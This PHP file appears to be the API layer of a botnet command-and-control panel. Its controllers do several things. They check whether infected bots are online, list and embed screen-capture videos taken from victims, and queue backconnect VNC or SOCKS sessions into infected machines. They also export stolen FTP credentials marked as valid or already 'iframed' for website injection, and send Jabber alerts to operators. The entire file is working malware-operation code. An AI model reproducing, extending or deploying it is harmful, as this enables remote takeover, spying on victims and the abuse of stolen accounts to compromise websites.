<?php
/**
 * api.php Controllers
 */

require_once 'system/lib/db.php';
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/MVC.php';


class _Controller {
	/** DB PDO connection
	 * @var dbPDO
	 */
	protected $db;

	function __construct(){
		$this->db = dbPDO::singleton();
	}
}



class BotsController {
    /** Get bots online status: an object that maps { botId: value } , where `bool` tells whether the bot is online.
     * When no such botId is known - `bool` says `null`
     * @param string[] $botId
     * @return array { botId: bool }
     */
    function actionOnline($botId){
        $botId = (array)$botId;
        $q_placeholders = implode(',', array_fill(0, count($botId), '?'));

        # Fetch bots online
        $db = dbPDO::singleton();
        $q = $db->query('
            SELECT
                `b`.`bot_id`,
                (`b`.`rtime_last` >= (UNIX_TIMESTAMP() - ?)) AS `bot_online`
            FROM `botnet_list` `b`
            WHERE
                `b`.`bot_id` IN('.$q_placeholders.')
            ORDER BY `bot_online` DESC, `b`.`rtime_last` DESC, `bot_id` ASC
            ;',  array_merge(
                    array($GLOBALS['config']['botnet_timeout']),
                    $botId
                )
        );

        $online = array();
        while ($bot = $q->fetchObject())
            $online[$bot->bot_id] = (bool)$bot->bot_online;

        # Add missing bots to the array
        foreach (array_diff($botId, array_keys($online)) as $bot_id)
            $online[$bot_id] = null;

        return $online;
    }
}



class VideoController {
	function __construct(){
		$this->files = $GLOBALS['config']['reports_path'].'/files';
		$this->url = 'http://'.$_SERVER['HTTP_HOST'].dirname($_SERVER['SCRIPT_NAME']);
	}

	/** Search for videos by botnet/botId or botnet/botIP
	 * Set $embed=1 to include embed-codes into the output
	 */
	function actionList($botId = null, $botIP = null, $botnet = '*', $embed = false){
		# Find BotID by IP
		if (is_null($botId) && !is_null($botIP))
			if (is_null($botId = bot_ip2id($botIP)))
				throw new ActionException('BotIP not found');
		# Still not found?
		if (is_null($botId))
			return array();
		# List videos for $botId
		$ret = array(
			'botnet' => $botnet,
			'botId' => $botId,
			'videos' => array(),
		);
		$files_ = glob("{$this->files}/$botnet/$botId/*.webm");
		if ($files_ === FALSE) $files_ = array();
		foreach ($files_ as $f)
			if ($embed)
				$ret['videos'][] = array('file' => $f, 'embed' => $this->actionEmbed($botId, basename($f), $botnet));
			else
				$ret['videos'][] = basename($f);
		return $ret;
	}

	/** Get the embed-code for a video, previously found by the `List` operation
	 */
	function actionEmbed($botId, $video, $botnet = '*'){
		$files = glob("{$this->files}/$botnet/$botId/$video");
		if ($files === FALSE || count($files) == 0)
			throw new ActionException("File not found: '$botnet/$botId/$video'");
		$file = array_shift($files);
		$file_url = "{$this->url}/$file";
		return '<video controls><source src="'.htmlentities($file_url).'" type=\'video/webm; codecs="vp8, vorbis"\'/><a href="'.htmlentities($file_url).'" class="video-fallback">Download Video</a></video>';
	}
}



class VNCController extends _Controller {
	/** Create a bot backconnect task
	 */
	function actionConnect($botId = null, $botIP = null, $protocol = 'VNC'){
		if (is_null($botId) && !is_null($botIP))
			if (is_null($botId = bot_ip2id($botIP)))
				throw new ActionException('BotIP not found');

		# Request a reconnect
		$this->db->query(
			'INSERT INTO `vnc_bot_connections`
			 VALUES(:botid, :protocol, :do_connect, 0, :my_port, 0)
			 ON DUPLICATE KEY UPDATE
			    `protocol`=:protocol,
			    `do_connect`=:do_connect, `ctime`=0
			 ;', array(
			':botid' => $botId,
			':protocol' => $protocol=='SOCKS' ? 5 : 1,
			':do_connect' => 1, # oneshot
			':my_port' => rand(40000, 50000) # different range for better conflict prevention :)
		));

		# Get host:port
		$q = $this->db->query(
			'SELECT `my_port`
			 FROM `vnc_bot_connections`
			 WHERE `bot_id`=:botId
			 ;', array(
			':botId' => $botId,
		));
		$port = $q->fetchColumn(0);

		return array(
			'status' => 'ok',
			'host' => $GLOBALS['config']['vnc_server'],
			'port' => $port
		);
	}
}



class IFramerController {
	/** Fetch FTP accounts
	 * @param string $date_from Date filter: only accounts that were found >= this date. 
	 * @param string $state Accounts state: 'all', 'valid', 'iframed'
	 */
	function actionFtpList($date_from = null, $state = 'all', $plaintext = 0){
		$db = dbPDO::singleton();
		$q = $db->prepare('
			SELECT `id`, `found_at`, `ftp_acc`
			FROM `botnet_rep_iframer` `f`
			WHERE
				(:date_from IS NULL OR `found_at` >= UNIX_TIMESTAMP(:date_from)) AND
				(
					(:state = "valid" AND `is_valid`=1) OR
					(:state = "iframed" AND `s_page_count`>0) OR
					:state = "all"
					)
			');
		$q->execute(array('date_from' => $date_from, 'state' => $state));

		$ret = $q->fetchAll(PDO::FETCH_OBJ);

		# Stupid plaintext format?
		if ($plaintext){
			foreach($ret as $row)
				echo "{$row->ftp_acc}\n";
			return FALSE; # no format
		}

		return $ret;
	}
}



require_once 'system/lib/notify.php';

class JabberController {
    /** Send an arbitrary message to JIDs specified in the 'Jabber Notifier' section
     * @param string|string[] $message Arbitrary message text to send
     * @return bool
     */
    function actionSend($message){
        $immediately = jabber_notify_somehow($GLOBALS['config']['reports_jn_to'], $message);
        return array('sent' => $immediately? 'now' : 'delayed');
    }
}
